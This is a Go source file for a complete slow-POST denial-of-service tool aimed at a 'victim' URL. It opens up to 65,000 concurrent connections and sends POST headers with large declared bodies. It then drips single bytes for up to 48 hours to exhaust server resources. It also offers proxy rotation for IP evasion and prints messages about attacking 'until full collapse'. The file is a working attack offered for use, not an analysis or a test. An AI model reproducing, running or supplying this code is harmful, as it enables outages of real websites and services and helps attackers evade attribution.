package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/url"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

var (
	victimUrl     = flag.String("url", "", "Target URL (required)")
	testDuration  = flag.Duration("duration", 48*time.Hour, "Total attack duration")
	workers       = flag.Int("workers", 65000, "Number of concurrent connections (max per IP: 64K)")
	rampUpDelay   = flag.Duration("ramp", 1*time.Millisecond, "Time delay between connection launches")
	useProxies    = flag.Bool("proxies", false, "Enable proxy list rotation for IP evasion")
	proxyFilePath = flag.String("proxy-file", "proxies.txt", "Path to proxy list file (used if proxies are enabled)")
	tlsConfig      = &tls.Config{InsecureSkipVerify: true, SessionTicketsDisabled: false}
	sleepMin       = 1 * time.Millisecond
	sleepMax       = 5 * time.Millisecond
	reconnectDelay = 0 * time.Millisecond
	connCounter    = &ConnectionCounter{}
	stats          = &AttackStats{}
	proxies        []string
)

type ConnectionCounter struct {
	sync.Mutex
	count int
}

func (cc *ConnectionCounter) Increment() {
	cc.Lock()
	cc.count++
	cc.Unlock()
}

func (cc *ConnectionCounter) Decrement() {
	cc.Lock()
	cc.count--
	cc.Unlock()
}

func (cc *ConnectionCounter) Get() int {
	cc.Lock()
	defer cc.Unlock()
	return cc.count
}

type AttackStats struct {
	sync.Mutex
	totalConnections int
	cps              int
}

func (as *AttackStats) Increment() {
	as.Lock()
	as.totalConnections++
	as.cps++
	as.Unlock()
}

func (as *AttackStats) GetStats() (int, int) {
	as.Lock()
	defer as.Unlock()
	return as.totalConnections, as.cps
}

func resetCPS() {
	for {
		time.Sleep(1 * time.Second)
		stats.Lock()
		stats.cps = 0
		stats.Unlock()
	}
}

func displayLiveStatus() {
	for {
		time.Sleep(1 * time.Second)
		holding := connCounter.Get()
		total, cps := stats.GetStats()
		fmt.Printf("\r💀 [LIVE STATUS] Holding: %d | Total Attempts: %d | CPS: %d", holding, total, cps)
	}
}

func loadProxies() {
	if !*useProxies {
		return
	}

	file, err := os.Open(*proxyFilePath)
	if err != nil {
		log.Fatalf("Failed to load proxy file: %s\n", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}
}

func main() {
	flag.Parse()

	if *victimUrl == "" {
		log.Fatal("Usage: go run main.go -url <target_url> -duration <time> -workers <connections> [-proxies]")
	}

	runtime.GOMAXPROCS(runtime.NumCPU() * 2)
	victimUri, err := url.Parse(*victimUrl)
	if err != nil {
		log.Fatalf("Invalid URL: %s\n", err)
	}

	victimHostPort := victimUri.Host
	if !strings.Contains(victimHostPort, ":") {
		port := "80"
		if victimUri.Scheme == "https" {
			port = "443"
		}
		victimHostPort = net.JoinHostPort(victimHostPort, port)
	}

	if *useProxies {
		loadProxies()
	}

	log.Printf("💀 Unleashing attack on %s until full collapse...\n", *victimUrl)

	go resetCPS()
	go displayLiveStatus()

	for i := 0; i < *workers; i++ {
		go launchAttack(victimHostPort, victimUri)
		time.Sleep(*rampUpDelay)
	}

	time.Sleep(*testDuration)
}

func launchAttack(victimHostPort string, victimUri *url.URL) {
	isTls := (victimUri.Scheme == "https")

	for {
		conn := establishConnection(victimHostPort, isTls)
		if conn != nil {
			go persistentFlood(conn, victimUri)
		}
		time.Sleep(reconnectDelay)
	}
}

func establishConnection(hostPort string, isTls bool) io.ReadWriteCloser {
	conn, err := net.Dial("tcp", hostPort)
	if err != nil {
		return nil
	}

	if !isTls {
		return conn
	}

	tlsConn := tls.Client(conn, tlsConfig)
	if err = tlsConn.Handshake(); err != nil {
		conn.Close()
		return nil
	}

	connCounter.Increment()
	stats.Increment()
	return tlsConn
}

func persistentFlood(conn io.ReadWriteCloser, victimUri *url.URL) {
	defer func() {
		conn.Close()
		connCounter.Decrement()
	}()

	requestHeader := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n", victimUri.RequestURI(), victimUri.Host, rand.Intn(1024*1024)+512)
	if _, err := conn.Write([]byte(requestHeader)); err != nil {
		return
	}

	for {
		if _, err := conn.Write([]byte("X")); err != nil {
			return
		}
		time.Sleep(time.Duration(rand.Intn(int(sleepMax-sleepMin))) + sleepMin)
	}
}
